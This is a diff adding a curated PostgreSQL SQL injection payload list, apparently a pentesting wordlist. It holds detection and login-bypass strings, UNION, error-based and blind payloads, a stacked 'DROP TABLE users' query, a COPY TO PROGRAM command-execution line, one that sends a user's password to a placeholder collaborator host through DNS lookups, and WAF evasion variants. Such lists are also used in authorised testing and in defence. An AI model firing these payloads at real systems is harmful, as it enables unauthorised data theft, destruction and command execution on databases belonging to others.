@@ -1,0 +1,47 @@
+# PostgreSQL SQLi — SOTA curated
+# Full lists: sqli/postgres-enum.txt, sqli/time-based.txt, sqli/union-select.txt (PAT sync)
+
+# Detection
+'
+' OR '1'='1'--
+") OR ("1"="1"--
+') OR ('1'='1'--
+
+# Auth bypass
+admin'--
+' OR 1=1--
+' OR 'a'='a'--
+
+# UNION
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT version(),NULL--
+' UNION SELECT current_user,NULL--
+' UNION SELECT table_name,NULL FROM information_schema.tables--
+
+# Error-based
+' AND 1=CAST((SELECT version()) AS int)--
+' AND 1=CAST((SELECT current_user) AS int)--
+
+# Boolean blind
+' AND 1=1--
+' AND 1=2--
+' AND SUBSTRING(version(),1,1)='P'--
+
+# Time blind
+'; SELECT pg_sleep(5)--
+' OR pg_sleep(5)--
+1; SELECT pg_sleep(5)--
+' OR (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--
+
+# Stacked
+'; DROP TABLE users;--
+'; COPY (SELECT '') TO PROGRAM 'nslookup COLLAB.subdomain';--
+
+# OAST exfil
+'; SELECT copy (SELECT '') to program 'nslookup '||(SELECT password FROM users LIMIT 1)||'.COLLAB.subdomain';--
+
+# WAF bypass
+'/**/OR/**/1=1--
+'%0AOR%0A1=1--
+' Or 1=1--
